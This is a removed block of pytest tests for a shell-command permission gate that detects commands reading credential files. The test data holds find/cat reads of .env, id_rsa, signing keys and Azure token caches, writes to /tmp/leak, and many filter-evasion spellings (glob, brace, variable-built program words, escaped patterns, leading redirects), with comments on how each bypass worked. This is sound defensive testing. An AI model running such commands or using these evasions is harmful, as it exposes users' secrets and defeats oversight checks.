-    @pytest.mark.parametrize(
-        "command",
-        (
-            # ONE SPACE after the opener moved it into a token of its own, so the
-            # two-character test on the program word's token missed it entirely --
-            # the identical read, denied glued and allowed spaced
-            "cat $( find ~/.kiro/crew -name .env )",
-            "cat ` find ~/.kiro/crew -name .env `",
-            "cat < <( find ~/.kiro/crew -name .env )",
-            "head -c 80 $(   find ~/.kiro/crew -name .env   )",
-            # nested one substitution deep
-            "cat $(echo $( find ~/.kiro/crew -name .env ))",
-            # the glued twins, which were already denied -- the parity controls
-            "cat $(find ~/.kiro/crew -name .env)",
-            "cat <(find ~/.kiro/crew -name .env)",
-        ),
-    )
-    def test_capture_does_not_depend_on_the_spacing_of_the_opener(self, command: str) -> None:
-        """Capture is a property of the view, not of two characters glued to a token."""
-        assert security.is_sensitive_bash_command(command), command
-
-    def test_a_view_is_captured_by_how_it_was_derived(self) -> None:
-        """The mechanism itself: a substitution body carries capture, a payload inherits it."""
-        outer = "cat $( find ~ -name .env )"
-        views = dict(security._find_traversal_views(outer))
-        # the command's own text is not captured -- something must consume it
-        assert views[outer] is False
-        # the substitution's body is, whatever the spacing inside it
-        assert views[" find ~ -name .env "] is True
-        # a `-c` payload prints where its wrapper prints, so it is NOT captured
-        payload_views = dict(security._find_traversal_views("bash -c 'find ~ -type f'"))
-        assert payload_views["find ~ -type f"] is False
-        # ...unless the wrapper itself is captured
-        both = dict(security._find_traversal_views("cat $(bash -c 'find ~ -type f')"))
-        assert both["find ~ -type f"] is True
-
-    @pytest.mark.parametrize(
-        "program",
-        ("/usr/bin/f?nd", "f?nd", "/usr/bin/fin*", "/usr/bin/fin[d]", "f*d", "?ind", "*"),
-    )
-    def test_a_glob_expanded_program_word_still_names_find(self, program: str) -> None:
-        """The shell expands the program word against the filesystem before running it.
-
-        An exact-string basename test read ``f?nd``, matched nothing, and skipped the
-        whole pass while the shell ran ``find``. The glob is answered by the same
-        bounded matcher the filters use, so no spelling is enumerated.
-        """
-        command = f"{program} ~/.kiro/crew -name '.env' -exec cat {{}} +"
-        assert security.is_sensitive_bash_command(command), command
-
-    def test_the_program_word_glob_is_bounded_and_fails_closed(self) -> None:
-        """A word the wildcard cap refuses is read as a match, so the cap cannot open a hole."""
-        assert security._find_program_word_names_find("find") is True
-        assert security._find_program_word_names_find("/usr/bin/gfind") is True
-        assert security._find_program_word_names_find("f?nd") is True
-        # runs SEPARATED by literals cannot be collapsed, so this is the shape the cap
-        # actually refuses -- an adjacent run (`****d`) collapses to one `.*` and
-        # compiles, so it would exercise the matcher rather than the refusal path
-        refused = "*a" * 10 + "*d"
-        assert security._find_glob_matcher(refused) is None, refused
-        assert security._find_program_word_names_find(refused) is True
-        # and a word that cannot be find is still not find, so ordinary globs are free
-        assert security._find_program_word_names_find("grep") is False
-        assert security._find_program_word_names_find("*.py") is False
-        assert security._find_program_word_names_find("c?t") is False
-
-    def test_a_glob_bearing_command_that_names_no_traversal_is_untouched(self) -> None:
-        """The bail-out widened, so pin that the widening costs work and not verdicts."""
-        for command in (
-            "cat *.md | head -5",
-            "ls -la ~/Repos/*/package.json",
-            "grep -rn TODO src/*.py",
-            "rm -f build/*.o",
-        ):
-            assert security.is_sensitive_bash_command(command) is None, command
-
-    @pytest.mark.parametrize(
-        "command",
-        (
-            # GNU find reads its roots from a file, or from stdin for `-`, so the
-            # command names no root and a parse reading only operands defaulted to `.`
-            "printf '%s\\0' ~/.kiro/crew | find -files0-from - -name .env -exec cat {} +",
-            "find -files0-from roots.txt -name .env -exec cat {} +",
-            "find -files0-from - -name token_signing.key | xargs cat",
-        ),
-    )
-    def test_roots_read_from_outside_the_command_line(self, command: str) -> None:
-        """An unreadable root source is read as unknowable, so the filter decides."""
-        assert security.is_sensitive_bash_command(command), command
-
-    def test_an_unreadable_root_source_still_lets_the_filter_decide(self) -> None:
-        """The bound: `-files0-from` is not a denial on its own."""
-        for command in (
-            "find -files0-from roots.txt -name '*.o' -delete",
-            "find -files0-from - -name '*.pyc' -delete",
-            # and a listing delivers nothing whatever its roots are
-            "find -files0-from - -name .env",
-        ):
-            assert security.is_sensitive_bash_command(command) is None, command
-
-    def test_an_unknowable_root_with_nothing_left_to_decide_is_not_denied(
-        self, monkeypatch
-    ) -> None:
-        """The widened root readings are only sound while a filter can reject them.
-
-        With no evaluable filter the traversal is read as ``*``, so the bare-home
-        reading matched every fence and denied an ordinary unresolved-root sweep
-        outright -- contradicting `_find_root_readings`' own docstring (found in
-        review). ``TMPDIR`` is pointed outside the fence because this suite relocates
-        the crew home under the pytest base temp dir, so the ambient value really can
-        contain a fence and the deny would be correct there.
-        """
-        monkeypatch.setenv("TMPDIR", "/var/tmp")
-        for command in (
-            'find "$TMPDIR" -type f -delete',
-            'find "$SRC" -type f -exec cat {} +',
-            "find $OUT -regex '.*[.]map' -delete",
-        ):
-            assert security.is_sensitive_bash_command(command) is None, command
-        # and the filtered readings still deny, which is what the widening is for
-        assert security.is_sensitive_bash_command("find $D -name .env -exec cat {} +")
-        assert security.is_sensitive_bash_command(
-            "find ${D}/crew -name token_signing.key | xargs cat"
-        )
-
-    def test_the_view_walk_terminates_without_a_depth_cap(self) -> None:
-        """No depth cap: a cap is a bypass, so termination is structural instead.
-
-        A view is a proper substring of its parent and so is strictly shorter, and a visited
-        set stops sibling wrappers re-walking the same text.
-
-        Asserted STRUCTURALLY rather than on a wall clock. The earlier form bounded elapsed
-        time over the whole gate, which measures the other passes too: at 300 substitutions
-        those cost 2365 ms on this branch and 2369 ms on a tree without this pass at all, so
-        the bound was a claim about code this change does not touch -- and it duly failed on
-        a slow Windows runner (10.25 s against a 10 s budget) for a cost this change does not
-        create. A view count and a budget comparison are deterministic and test the actual
-        invariants.
-        """
-        nested = "find ~ -name .env"
-        for _ in range(40):
-            nested = f"bash -c '{nested}'"
-        views = security._find_traversal_views(nested)
-        # The walk terminates and collapses, rather than enumerating a view per level. Note
-        # this input is a TERMINATION stress case, not a semantically 40-deep command: naive
-        # single-quote wrapping does not nest in shell, so the layers flatten and only a few
-        # views exist. No verdict is asserted on it for that reason -- the nested-payload
-        # behaviour is covered by the tests that build a genuinely nested `-c` payload.
-        assert 0 < len(views) <= 8, len(views)
-        # A command carrying more substitutions than the budget is REFUSED rather than
-        # walked, which is what bounds the cost. Sized just past the budget on purpose: the
-        # invariant is the comparison, and a pathological width would only re-import the
-        # other passes' cost into this test's runtime.
-        wide = "; ".join(f"echo $(ls dir{i})" for i in range(75)) + "; find ~ -type f"
-        assert security._find_substitution_openers(wide) > security._FIND_SUBSTITUTION_BUDGET
-        assert security.is_sensitive_bash_command(wide), "over-budget commands must deny"
-
-    @pytest.mark.parametrize(
-        ("word", "expected"),
-        (
-            # Bash's brace grammar in full: comma lists, sequences, nesting. Each
-            # expected set was measured against `bash -c 'printf %s\n <word>'` and then
-            # hard-coded, because this suite also runs on Windows where bash is absent.
-            # The comma forms were closed first and the SEQUENCE forms were missing --
-            # the class had been sampled rather than closed, which is why the table is
-            # exhaustive now.
-            ("x{a,b}", {"xa", "xb"}),
-            ("x{,a}", {"x", "xa"}),
-            ("x{a,{b,c}}", {"xa", "xb", "xc"}),
-            ("x{a..c}", {"xa", "xb", "xc"}),
-            ("x{a..a}", {"xa"}),
-            ("x{1..3}", {"x1", "x2", "x3"}),
-            ("x{1..9..3}", {"x1", "x4", "x7"}),
-            ("x{c..a}", {"xa", "xb", "xc"}),
-            ("p{a,b}s", {"pas", "pbs"}),
-            ("{a,b}{c,d}", {"ac", "ad", "bc", "bd"}),
-            ("x{a,{1..2}}", {"x1", "x2", "xa"}),
-            ("x{01..03}", {"x01", "x02", "x03"}),
-        ),
-    )
-    def test_the_brace_grammar_is_covered_in_full(self, word: str, expected: set) -> None:
-        """Every form bash expands, this pass enumerates.
-
-        Asserted as a superset rather than equality: the pass keeps the original spelling
-        alongside the expansions, and extra readings can only ever add a denial.
-        """
-        produced = set(security._find_brace_expansions(word) or []) | {word}
-        assert expected.issubset(produced), f"{word}: missing {sorted(expected - produced)}"
-
-    def test_a_mixed_or_zero_step_sequence_stays_literal(self) -> None:
-        """`{a..3}` and a zero step are not expansions in bash either, so neither here."""
-        assert security._find_brace_sequence("a..3") == []
-        assert security._find_brace_sequence("1..9..0") == []
-        assert security._find_brace_sequence("notasequence") is None
-
-    @pytest.mark.parametrize(
-        "program",
-        (
-            # brace expansion in the PROGRAM word: `find` to the shell, and matched
-            # nothing here because braces are neither a literal spelling nor a glob
-            "f{in,oo}d",
-            "f{oo,in}d",
-            "f{i..i}nd",
-            "fin{d,e}",
-            "{f,g}ind",
-        ),
-    )
-    def test_a_brace_expanded_program_word_is_still_find(
-        self, monkeypatch, tmp_path, program: str
-    ) -> None:
-        """The traversal pass was skipped entirely when the program word carried braces."""
-        home = self._fake_home_with_stores(monkeypatch, tmp_path)
-        assert security.is_sensitive_bash_command(
-            f"{program} {home} -type f -exec cat {{}} +"
-        ), program
-
-    def test_a_brace_program_word_that_is_not_find_still_runs(self, monkeypatch, tmp_path) -> None:
-        """Expanding the program word must not make every braced word a traversal."""
-        home = self._fake_home_with_stores(monkeypatch, tmp_path)
-        for benign in ("ec{h,j}o hello", "l{s,l} /tmp", "gr{e,a}p x file"):
-            assert not security.is_sensitive_bash_command(benign), benign
-        assert home
-
-    def test_deeply_nested_braces_refuse_instead_of_exhausting_the_stack(self) -> None:
-        """A nested group is expanded by a recursive call, so text depth was stack depth.
-
-        1,200 nested groups raised an uncaught `RecursionError` out of the synchronous
-        permission check -- a crash rather than a verdict, and introduced by this pass
-        (main answers the same input fine, having no such recursion). The depth budget is
-        checked before anything recurses, so the refusal is structural rather than a
-        rescued exception.
-        """
-        shallow = "dir/" + "{a," * 2 + "b" + "}" * 2
-        assert security._find_brace_nesting_depth(shallow) == 2
-        # Under budget: still enumerated and judged on the merits, not refused.
-        assert security._find_brace_expansions(shallow) is not None
-        for depth in (security._FIND_BRACE_DEPTH_BUDGET + 1, 1200, 3000):
-            root = "dir/" + "{a," * depth + "b" + "}" * depth
-            assert security._find_brace_nesting_depth(root) == depth
-            assert security._find_brace_expansions(root) is None, depth
-            # And the gate returns a verdict rather than raising, which is the property
-            # the crash violated.
-            command = f"find {root} -type f -exec cat {{}} +"
-            assert security.is_sensitive_bash_command(command), depth
-
-    @pytest.mark.parametrize(
-        "prelude",
-        (
-            # every literal spelling of an APPEND-built program word. `+=` is a gap in the
-            # same resolver that already handles `=`, and the tail is a literal, so the
-            # set is decided by the text and closes at once.
-            "F=fi; F+=nd; $F",
-            "F=fi; F+=nd; ${F}",
-            "F=; F+=find; $F",
-            "F=f; F+=i; F+=nd; $F",
-            "F=fi; F+=n; ${F}d",
-            "F=fi; F+='nd'; $F",
-            'F=fi; F+="nd"; $F',
-            "F=fi ; F+=nd ; $F",
-        ),
-    )
-    def test_an_append_built_program_word_still_resolves_to_find(
-        self, monkeypatch, tmp_path, prelude: str
-    ) -> None:
-        """`F=fi; F+=nd; $F <fenced> ...` ran a `find` this pass never saw.
-
-        The single-assignment twin (`F=fin; ${F}d`) was closed earlier, so the mechanism
-        was present and only the `+=` spelling escaped it -- the recurring shape in this
-        PR. Parametrised over the whole set rather than the reported example.
-        """
-        home = self._fake_home_with_stores(monkeypatch, tmp_path)
-        assert security.is_sensitive_bash_command(
-            f"{prelude} {home} -type f -exec cat {{}} +"
-        ), f"an append-built program word must resolve: {prelude}"
-
-    def test_appending_does_not_invent_a_traversal_that_is_not_there(
-        self, monkeypatch, tmp_path
-    ) -> None:
-        """The append resolver must not turn ordinary variable building into a denial.
-
-        Guards the direction the fix could have over-reached in: appends that never
-        spell a traversal program, and an append used as an argument rather than as the
-        program word.
-        """
-        home = self._fake_home_with_stores(monkeypatch, tmp_path)
-        for benign in (
-            "F=he; F+=llo; echo $F",
-            "D=/tm; D+=p; ls $D",
-            "P=fin; P+=ger; $P someone",  # `finger`, not `find`
-            f"X=nd; echo {tmp_path.as_posix()}/$X",
-            "F=fi; F+=nd; echo $F",  # names find but runs nothing
-        ):
-            assert not security.is_sensitive_bash_command(benign), benign
-        assert home
-
-    def test_the_azure_bearer_token_cache_is_named(self, monkeypatch, tmp_path) -> None:
-        """`accessTokens.json` holds Azure access and refresh tokens.
-
-        Pinned with the coherence test this vocabulary requires: a DIRECT read of the
-        file already denies, so naming it makes the traversal agree with the direct read
-        instead of becoming stricter than it. A name that failed that test would belong
-        in #8074 rather than here.
-        """
-        home = self._fake_home_with_stores(monkeypatch, tmp_path)
-        azure = Path(home) / ".azure"
-        azure.mkdir(parents=True, exist_ok=True)
-        (azure / "accessTokens.json").write_text("[]\n")
-        direct = f"cat {(azure / 'accessTokens.json').as_posix()}"
-        assert security.is_sensitive_bash_command(direct), "premise: the direct read denies"
-        for spelling in ("accessTokens.json", "accesstokens.json"):
-            assert security.is_sensitive_bash_command(
-                f"find {home} -name {spelling} -exec cat {{}} +"
-            ), spelling
-
-    @pytest.mark.parametrize(
-        "spell",
-        (
-            # every group shape the shell expands, since brace expansion is decided by
-            # the TEXT and is therefore a closed set rather than one example. Each spelling
-            # is built from the REAL leaf name at run time: hard-coding one planted a path
-            # that named nothing on the fake home and passed for the wrong reason.
-            pytest.param(lambda leaf: "{%s,%s}" % (leaf, leaf), id="both-alts-equal"),
-            pytest.param(lambda leaf: "{%s,zzz}" % leaf, id="first-alt-fenced"),
-            pytest.param(lambda leaf: "{zzz,%s}" % leaf, id="second-alt-fenced"),
-            pytest.param(lambda leaf: "%s{%s,x}" % (leaf[:2], leaf[2:]), id="split-leaf"),
-            pytest.param(lambda leaf: "{%s{%s,x},y}" % (leaf[:2], leaf[2:]), id="nested-group"),
-            pytest.param(lambda leaf: "%s{,x}" % leaf, id="empty-alt-first"),
-            pytest.param(lambda leaf: "%s{x,}" % leaf, id="empty-alt-last"),
-        ),
-    )
-    def test_a_brace_expanded_root_is_read_as_the_paths_it_expands_to(
-        self, monkeypatch, tmp_path, spell
-    ) -> None:
-        """A brace-carrying root named no fenced path textually while the shell handed
-        `find` the fenced directory anyway.
-
-        Brace expansion belongs with quoting and backslash escaping rather than with
-        globbing: it is finite, and enumerating it needs no filesystem. So the whole
-        set closes at once, which is why this is parametrised over the group shapes
-        instead of the one spelling that was reported.
-        """
-        home = self._fake_home_with_stores(monkeypatch, tmp_path)
-        parent, _, leaf = home.rpartition("/")
-        # The brace-free twin must deny, or the case below proves nothing.
-        assert security.is_sensitive_bash_command(f"find {home} -type f -exec cat {{}} +")
-        braced = f"{parent}/{spell(leaf)}"
-        assert security.is_sensitive_bash_command(
-            f"find {braced} -type f -exec cat {{}} +"
-        ), f"a brace-expanded root reaching the fence must deny: {braced}"
-
-    def test_both_width_budgets_refuse_rather_than_resolve(self, monkeypatch, tmp_path) -> None:
-        """Root count and brace expansion are both widths the text can inflate freely.
-
-        Cost is asserted structurally -- a bound exists and over-budget input is
-        refused -- and never as elapsed time: a wall-clock assertion here would measure
-        the runner, and the surrounding passes already dominate a command this wide.
-        """
-        home = self._fake_home_with_stores(monkeypatch, tmp_path)
-        # Under the root budget, the verdict is still decided on the merits.
-        narrow = "find " + " ".join(f"d{i}" for i in range(4)) + " -type f -exec cat {} +"
-        assert not security.is_sensitive_bash_command(narrow)
-        # Over it, the traversal is refused rather than resolved root by root.
-        wide = (
-            "find "
-            + " ".join(f"d{i}" for i in range(security._FIND_ROOT_BUDGET + 5))
-            + " -type f -exec cat {} +"
-        )
-        assert security.is_sensitive_bash_command(wide), "over-budget root counts must deny"
-        # Brace expansion is multiplicative, so a handful of groups exceeds its budget
-        # while the command stays short. Also refused, not enumerated.
-        groups = "{a,b}" * 8  # 2**8 = 256 forms, well past the budget
-        assert security._find_brace_expansions(f"dir/{groups}") is None
-        assert security.is_sensitive_bash_command(f"find dir/{groups} -type f -exec cat {{}} +")
-        # And a brace root that stays within budget is still judged on the merits, so
-        # neither budget can be what produced the denials above.
-        benign = f"find {tmp_path.as_posix()}/{{a,b}} -name '*.o' -delete"
-        assert not security.is_sensitive_bash_command(benign)
-        assert home  # the fake home is what makes the fenced comparison meaningful
-
-    @pytest.mark.parametrize(
-        "filter_and_sink",
-        (
-            # a wildcard that reaches an UNDECLARED store leaf -- the fence names no
-            # `id_rsa` anywhere, so only asking the store can answer this
-            "-name 'id_*' -exec cat {} +",
-            "-name 'id_rs?' -exec cat {} +",
-            "-name 'id_[re]*' | xargs cat",
-            "-name 'credential*' -exec cat {} +",
-            "-name '*_rsa' -exec base64 {} ;",
-        ),
-    )
-    def test_a_wildcard_reaching_an_undeclared_store_leaf(
-        self, monkeypatch, tmp_path, filter_and_sink: str
-    ) -> None:
-        """``-name id_rsa`` was denied while ``-name 'id_*'`` read the same key.
-
-        The store probe was cut back to literal names because matching globs against
-        every entry measured three false positives. That read the trade as "broad
-        probe or no probe", and it is not one: the false positives are all
-        NON-credential basenames in fenced directories that are operational rather
-        than pure stores, so a filename predicate separates them from the leak
-        (found in review).
-        """
-        home = self._fake_home_with_stores(monkeypatch, tmp_path)
-        assert security.is_sensitive_bash_command(f"find {home} {filter_and_sink}")
-        security._home_targets_cache.clear()
-
-    def test_the_measured_false_positive_families_stay_allowed(self, monkeypatch, tmp_path) -> None:
-        """The boundary of the clause above, pinned on the families that cost.
-
-        Each is a real fenced directory holding an ordinary readable file: a sandbox
-        wrapper and a bundled script. The predicate is what keeps them allowed, so
-        this is the test that fails if it is ever widened to something like "any name
-        containing secret".
-
-        ``*.json`` and ``*.txt`` are deliberately NOT here. Both are denied, but by
-        the fence-DECLARED name route -- the fence lists entries whose own basename is
-        ``config.json`` and ``browser-cookies.txt`` -- which predates this change and
-        is pinned as intentional by
-        `test_a_glob_that_covers_a_declared_name_is_denied_on_purpose`. Listing them
-        here would claim the predicate rescues a case no predicate can reach; the
-        fence declaring a name is a stronger signal than any filename heuristic.
-        """
-        home = tmp_path / "home"
-        (home / ".kirocrew" / "run").mkdir(parents=True)
-        (home / ".kirocrew" / "run" / "wrapper.py").write_text("print(1)\n")
-        (home / ".local" / "share" / "kiro-cli").mkdir(parents=True)
-        (home / ".local" / "share" / "kiro-cli" / "tui.js").write_text("//\n")
-        monkeypatch.setenv("HOME", str(home))
-        monkeypatch.setenv("USERPROFILE", str(home))
-        security._home_targets_cache.clear()
-        home = home.as_posix()
-        for pattern in ("*.py", "*.js", "wrapper.*", "t*.js", "*.md"):
-            command = f"find {home} -name '{pattern}' -exec grep -l foo {{}} +"
-            assert security.is_sensitive_bash_command(command) is None, command
-        security._home_targets_cache.clear()
-
-    def test_the_credential_leaf_predicate_is_conservative(self) -> None:
-        """It answers about the NAME, and only for names that carry secrets anywhere."""
-        for name in ("id_rsa", "id_ed25519", "credentials", "credentials.db", ".netrc"):
-            assert security._looks_like_credential_leaf(name) is True, name
-        for name in ("server.pem", "signing.key", "store.jks", "app.p12"):
-            assert security._looks_like_credential_leaf(name) is True, name
-        # casefolded, because a case-insensitive filesystem opens the same file
-        assert security._looks_like_credential_leaf("ID_RSA") is True
-        # and it must NOT drift into the operational names that cost the false positives
-        for name in ("wrapper.py", "tui.js", "table.json", "config.json", "README.md"):
-            assert security._looks_like_credential_leaf(name) is False, name
-
-    def test_an_unreadable_store_does_not_crash_the_gate(self, monkeypatch, tmp_path) -> None:
-        """A store the process cannot list is now irrelevant: nothing lists it.
-
-        The clause that enumerated is gone, so an EPERM on a fenced directory cannot
-        reach the gate at all. Kept as a regression test because the previous revision
-        needed an explicit ``OSError`` guard, and a future one that reaches for the
-        filesystem again would need it back.
-        """
-        home = self._fake_home_with_stores(monkeypatch, tmp_path)
-        real_listdir = os.listdir
-
-        def denied(path, *a, **kw):
-            if ".ssh" in str(path):
-                raise PermissionError(13, "denied")
-            return real_listdir(path, *a, **kw)
-
-        monkeypatch.setattr(os, "listdir", denied)
-        assert (
-            security.is_sensitive_bash_command(f"find {home} -name '*.md' -exec cat {{}} +") is None
-        )
-        assert security.is_sensitive_bash_command(f"find {home} -name id_rsa -exec cat {{}} +")
-        security._home_targets_cache.clear()
-
-    # ── the round-6 review: state the SHELL resolves, and a probe pulling two ways ──
-
-    @pytest.mark.parametrize(
-        "command",
-        (
-            # the program word held in a variable this same command assigns
-            "F=find; $F ~/.kiro/crew -name .env -exec cat {} +",
-            "F=find; ${F} ~/.kiro/crew -name .env -exec cat {} +",
-            "P=/usr/bin/find; $P ~ -name token_signing.key | xargs cat",
-            # the ROOT held in a variable, with and without a filter -- the no-filter
-            # spelling is the one a bare "unresolved root" reading let through
-            'D=~/.kiro/crew; find "$D" -type f -exec cat {} +',
-            'D=~/.kiro/crew; find "$D" -name .env -exec cat {} +',
-            "D=~; find $D -name .env -exec cat {} +",
-        ),
-    )
-    def test_state_the_shell_resolves_is_resolved_here_too(self, command: str) -> None:
-        """A literal assigned in the same command is a literal the shell will run.
-
-        The plain-path passes already consumed `_resolve_local_assignments`, so
-        ``D=<fenced>; cat $D/.env`` was denied while ``D=<fenced>; find "$D" -type f``
-        was allowed -- the machinery existed and this pass was not wired into it, the
-        same shape as nested payloads. Resolving also separates the two cases an
-        unresolved-root reading conflated: an ASSIGNED root is judged as the real path,
-        while a genuinely unassigned one stays unknowable.
-        """
-        assert security.is_sensitive_bash_command(command), command
-
-    def test_a_genuinely_unassigned_root_is_still_not_denied(self, monkeypatch) -> None:
-        """The other side of that separation, and why it is not a contradiction.
-
-        One reviewer asked for the unfiltered unresolved-root denial to be withdrawn
-        as a false positive; another then reported an assigned fenced root reading
-        through. Both are right, and resolving the assignment is what makes them two
-        cases rather than opposite answers to one.
-        """
-        monkeypatch.setenv("TMPDIR", "/var/tmp")
-        for command in (
-            'find "$TMPDIR" -type f -delete',
-            'find "$SRC" -type f -exec cat {} +',
-            "find $BUILD -name '*.o' -delete",
-        ):
-            assert security.is_sensitive_bash_command(command) is None, command
-
-    def test_a_credential_leaf_nested_below_a_store_is_reached(self, monkeypatch, tmp_path) -> None:
-        """A whole-directory fence fences its whole subtree, so depth cannot matter.
-
-        The probe this replaced joined the name onto the store and stat'd it, seeing
-        only DIRECT children: ``~/.ssh/archive/id_rsa`` was read while the same name at
-        the top denied. Deciding from the name removes the depth question instead of
-        pushing the probe deeper -- which is also what removes the enumeration a
-        sibling finding objected to.
-        """
-        home = tmp_path / "home"
-        (home / ".ssh" / "archive" / "old").mkdir(parents=True)
-        (home / ".ssh" / "archive" / "old" / "id_rsa").write_text("-----BEGIN-----\n")
-        monkeypatch.setenv("HOME", str(home))
-        monkeypatch.setenv("USERPROFILE", str(home))
-        security._home_targets_cache.clear()
-        home = home.as_posix()
-        # every filter spelling of the one read answers alike -- name, glob and path
-        for filt in ("-name id_rsa", "-name 'id_*'", "-path '*/id_rsa'", "-name '*.pem'"):
-            command = f"find {home} {filt} -exec cat {{}} +"
-            assert security.is_sensitive_bash_command(command), command
-        # a non-credential name under the same store is the named residual
-        assert (
-            security.is_sensitive_bash_command(f"find {home} -name 'notes.md' -exec cat {{}} +")
-            is None
-        )
-        security._home_targets_cache.clear()
-
-    def test_the_name_test_needs_no_store_on_disk(self, monkeypatch, tmp_path) -> None:
-        """Deciding from the name drops a host-dependence that was never a feature.
-
-        Under the probe the identical command was allowed or denied according to
-        whether a store happened to exist yet. An empty home now denies the same
-        request -- the fail-closed direction, and the module's stated posture.
-        """
-        home = tmp_path / "home"
-        home.mkdir()
-        monkeypatch.setenv("HOME", str(home))
-        monkeypatch.setenv("USERPROFILE", str(home))
-        security._home_targets_cache.clear()
-        home = home.as_posix()
-        assert security.is_sensitive_bash_command(f"find {home} -name id_rsa -exec cat {{}} +")
-        assert (
-            security.is_sensitive_bash_command(f"find {home} -name '*.py' -exec cat {{}} +") is None
-        )
-        security._home_targets_cache.clear()
-
-    def test_a_path_glob_leaf_answers_like_a_name_glob_leaf(self, monkeypatch, tmp_path) -> None:
-        """``-path '*/id_*'`` is the same read as ``-name 'id_*'`` and must agree.
-
-        The previous revision routed only a `-path` pattern's LITERAL leaf to the
-        credential vocabulary, so ``*/id_rsa`` denied while ``*/id_*`` -- whose every
-        segment carries glob meta, so no literal leaf survives -- skipped the clause
-        entirely and delivered the key (traced in review).
-
-        The leaf cannot be tested on its own, which is why the fix is not "take the
-        last segment": a `-path` pattern's EARLIER segments constrain the path, so a
-        trailing wildcard matches any leaf while naming no store entry. The whole
-        pattern is matched against a synthetic fenced path instead.
-        """
-        home = tmp_path / "home"
-        (home / ".ssh").mkdir(parents=True)
-        (home / ".ssh" / "id_rsa").write_text("k\n")
-        (home / "proj" / "node_modules").mkdir(parents=True)
-        monkeypatch.setenv("HOME", str(home))
-        monkeypatch.setenv("USERPROFILE", str(home))
-        security._home_targets_cache.clear()
-        home = home.as_posix()
-        for filt in (
-            "-name id_rsa",
-            "-name 'id_*'",
-            "-path '*/id_rsa'",
-            "-path '*/id_*'",
-            "-ipath '*/ID_*'",
-            "-wholename '*/.ssh/id_*'",
-            "-path '*/id_?sa'",
-            "-path '*/*.pem'",
-        ):
-            command = f"find {home} {filt} -exec cat {{}} +"
-            assert security.is_sensitive_bash_command(command), command
-        # the bound: a trailing wildcard whose earlier segments cannot reach a store
-        for filt in ("-path '*/node_modules/*'", "-path '*/proj/*'", "-path '*/proj/index.js'"):
-            command = f"find {home} {filt} -exec rm {{}} +"
-            assert security.is_sensitive_bash_command(command) is None, command
-        security._home_targets_cache.clear()
-
-    @pytest.mark.parametrize(
-        "command",
-        (
-            # a redirect BEFORE the operands: the same write as the trailing spelling
-            "find >/tmp/leak ~/.kiro/crew -type f",
-            "find > /tmp/leak ~/.kiro/crew -type f",
-            "find >>/tmp/leak ~/.kiro/crew -type f",
-            "find 2>/tmp/leak ~/.kiro/crew -type f",
-            "find >/tmp/leak ~/.kiro/crew -name .env",
-            # the trailing twins, which were already denied -- the parity controls
-            "find ~/.kiro/crew -type f >/tmp/leak",
-            "find ~/.kiro/crew -type f > /tmp/leak",
-        ),
-    )
-    def test_a_redirect_before_the_operands_is_still_delivery(self, command: str) -> None:
-        """Parse ORDER must not decide the verdict.
-
-        The roots loop collected ``>`` and its target as traversal ROOTS, so delivery was
-        never seen: ``find >out <fenced> -type f`` was allowed while
-        ``find <fenced> -type f >out`` denied -- the same listing written to the same file,
-        with the redirect moved to the front (traced in review). Distinct from the
-        computed-operand class: nothing here is expanded, the tokens were simply
-        classified in the wrong role.
-        """
-        assert security.is_sensitive_bash_command(command), command
-
-    def test_a_leading_redirect_does_not_become_a_traversal_root(self) -> None:
-        """The other half: the redirect target must not be read as a root either.
-
-        Collecting it left a log path in the root list, which is both wrong and a way to
-        make an unrelated directory decide a fenced verdict.
-        """
-        tokens = security.normalize_shell_command(
-            security._find_space_unquoted_operators("find >/tmp/leak ~/.kiro/crew -type f")
-        )
-        parsed = security._parse_find_invocation(tokens, 1)
-        assert parsed.delivers is True
-        assert [r for r in parsed.roots if "leak" in r or r == ">"] == [], parsed.roots
-
-    @pytest.mark.parametrize(
-        "command",
-        (
-            r"find ~ -name '\.env' -exec cat {} +",
-            r"find ~ -name 'i\d_rsa' -exec cat {} +",
-            r"find ~ -name '\i\d\_\r\s\a' -exec cat {} +",
-            r"find ~ -name 'credential\s' -exec cat {} +",
-            r"find ~ -name '\c\r\e\d\e\n\t\i\a\l\s' -exec cat {} +",
-            # an escaped wildcard is a LITERAL asterisk to find; reading it as a wildcard
-            # over-matches, which is the safe direction
-            r"find ~ -name '\*.pem' -exec cat {} +",
-        ),
-    )
-    def test_a_backslash_escaped_filter_pattern_is_read_as_its_literal(self, command: str) -> None:
-        r"""GNU find reads ``\c`` as the literal ``c``, and a backslash is not glob meta.
-
-        So ``-name '\.env'`` was taken as the literal name ``\.env``, matched nothing in the
-        credential vocabulary, and was allowed while the unescaped twin denied -- and every
-        enumerated name had an escaped spelling that defeated the clause the same way
-        (found in review). Unescaped in `_find_pattern_operand`, the one place a pattern is
-        read, so no filter family can be missed.
-        """
-        assert security.is_sensitive_bash_command(command), command
-
-    def test_an_unescaped_pattern_is_unaffected(self) -> None:
-        """The control: the twins that already denied, and a benign glob that must not."""
-        assert security.is_sensitive_bash_command("find ~ -name '.env' -exec cat {} +")
-        assert security.is_sensitive_bash_command("find ~ -name id_rsa -exec cat {} +")
-        assert security.is_sensitive_bash_command("find ~ -name '*.pem' -exec cat {} +")
-        assert security.is_sensitive_bash_command("find ~ -name '*.py' -exec wc -l {} +") is None
-
-    def test_a_command_nesting_more_substitutions_than_the_budget_is_refused(self) -> None:
-        """The view walk is quadratic in DEPTH, so past a ceiling the pass denies.
-
-        Measured on this pass alone: depth 200 costs 129 ms, depth 800 costs 3.9 s, and a
-        1600-level command costs 28.9 s in the walk and 40.8 s through the whole gate,
-        against 1.0 s for the same command on a tree without this pass. The gate is
-        synchronous and the watchdog hard-exits long before that, so this is a crash shape.
-        Failing CLOSED is what makes the ceiling safe: the pre-filter this pass used to
-        carry decided to SKIP work and so became the bypass, whereas exceeding this one
-        denies.
-        """
-        deep = "echo " + "$(" * 200 + "find /tmp -type f" + ")" * 200
-        assert security.is_sensitive_bash_command(deep)
-        # a realistic amount of nesting is far below the ceiling and still judged normally
-        assert security._find_substitution_openers("cat $(find ~ -type f)") == 1
-        # a backtick substitution is delimited by TWO backticks, so a PAIR counts once
-        # -- `date`, $(pwd) and <(sort a) are three substitutions. Counting each end
-        # halved the effective ceiling for backtick spellings, which cost a real refusal
-        # once a source body's docstrings became subjects (a markdown code span is a
-        # pair) and bought nothing measurable: backticks are the cheap character here.
-        assert security._find_substitution_openers("echo `date` $(pwd) <(sort a)") == 3
-        # An unbalanced backtick opens an unterminated substitution, so ceil keeps it.
-        assert security._find_substitution_openers("echo `date") == 1
-        # Flat markdown-style spans no longer approach the ceiling: 66 backticks are 33
-        # substitutions, which is what a prose docstring actually carries.
